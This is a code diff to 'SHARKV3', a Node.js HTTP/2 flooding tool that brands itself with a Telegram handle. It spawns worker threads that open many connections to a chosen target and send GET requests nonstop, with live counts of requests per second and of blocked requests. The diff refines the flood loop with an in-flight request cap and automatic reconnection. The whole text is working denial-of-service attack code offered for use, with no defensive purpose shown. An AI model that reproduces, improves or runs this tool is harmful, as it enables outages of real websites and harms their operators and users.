@@ -2,11 +2,13 @@ const http2 = require('http2');
 const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
 const { cpus } = require('os');
 const readline = require('readline');
+const net = require('net');
 
 const THREADS = 16;
 const INITIAL_CONNECTIONS = 20;
 const POWER_MULTIPLIER = 2;
 const WARMUP_TIME = 5000;
+const MAX_INFLIGHT = 2000;
 
 let totalRequests = 0;
 let successCount = 0;
@@ -25,10 +27,12 @@ if (isMainThread) {
 
     console.clear();
     console.log(`Warming up... Starting attack in 5s`);
+
     setTimeout(() => {
         console.clear();
         console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
         console.log(`===========================`);
+
         for (let i = 0; i < THREADS; i++) {
             new Worker(__filename, { workerData: { target, duration, initial: true } });
         }
@@ -39,13 +43,12 @@ if (isMainThread) {
             }
         }, WARMUP_TIME);
 
-        // Update live stats every second
+        // Live stats
         setInterval(() => {
             maxRps = Math.max(maxRps, rpsLastSecond);
             renderStats();
             rpsLastSecond = 0;
         }, 1000);
-
     }, WARMUP_TIME);
 
     function renderStats() {
@@ -60,10 +63,7 @@ if (isMainThread) {
         console.log(`Blocked: ${errorCount}`);
     }
 
-    // Listen to stats from workers
-    const { createServer } = require('net');
-    const IPC_PORT = 9999;
-    const server = createServer(socket => {
+    const server = net.createServer(socket => {
         socket.on('data', data => {
             const msg = data.toString();
             if (msg === 'req') {
@@ -76,51 +76,57 @@ if (isMainThread) {
             }
         });
     });
-    server.listen(IPC_PORT);
+    server.listen(9999);
 } else {
-    const net = require('net');
     const { target, duration, initial } = workerData;
-    const end = Date.now() + duration * 1000;
     const connections = initial ? INITIAL_CONNECTIONS : INITIAL_CONNECTIONS * POWER_MULTIPLIER;
+    const end = Date.now() + duration * 1000;
 
     const socket = net.connect(9999, '127.0.0.1');
+    const sendStat = msg => socket.write(msg);
 
-    function sendStat(msg) {
-        socket.write(msg);
-    }
+    function sendOne(client, inflight) {
+        if (Date.now() > end) return;
 
-    function startFlood(client) {
-        const flood = setInterval(() => {
-            if (Date.now() > end) {
-                clearInterval(flood);
-                return;
-            }
+        if (inflight.count >= MAX_INFLIGHT) {
+            return setTimeout(() => sendOne(client, inflight), 1);
+        }
 
-            for (let i = 0; i < 1000; i++) {
-                try {
-                    const req = client.request({ ':path': '/', ':method': 'GET' });
-                    req.on('response', () => sendStat('ok'));
-                    req.on('error', () => sendStat('err'));
-                    req.end();
-                    sendStat('req');
-                } catch {
-                    sendStat('err');
-                }
-            }
-        }, 0);
+        try {
+            inflight.count++;
+            const req = client.request({ ':path': '/', ':method': 'GET' });
+            req.setNoDelay?.(true);
+            req.on('response', () => {
+                sendStat('ok');
+                inflight.count--;
+            });
+            req.on('error', () => {
+                sendStat('err');
+                inflight.count--;
+            });
+            req.end();
+            sendStat('req');
+        } catch {
+            inflight.count--;
+            sendStat('err');
+        }
+
+        setImmediate(() => sendOne(client, inflight));
     }
 
     function createConnection() {
         let client;
         try {
             client = http2.connect(target);
+            client.on('error', () => {});
+            client.on('close', () => setTimeout(createConnection, 100));
+            client.on('connect', () => {
+                const inflight = { count: 0 };
+                for (let i = 0; i < 100; i++) sendOne(client, inflight);
+            });
         } catch {
-            return setTimeout(createConnection, 250);
+            setTimeout(createConnection, 250);
         }
-
-        client.on('error', () => {});
-        client.on('close', () => setTimeout(createConnection, 100));
-        client.on('connect', () => startFlood(client));
     }
 
     for (let i = 0; i < connections; i++) {
